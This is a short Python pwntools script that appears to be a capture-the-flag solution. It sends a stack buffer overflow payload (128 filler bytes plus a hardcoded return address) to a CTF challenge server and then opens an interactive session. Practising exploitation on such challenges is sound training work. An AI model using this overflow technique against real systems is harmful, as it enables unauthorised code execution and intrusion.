#-*- coding:utf-8 -*-
from pwn import *


payload = ''
payload += "A"*128
payload += p32(0x0804849b)

r = remote('ctf.j0n9hyun.xyz', 3001)

r.send(payload)
r.interactive()
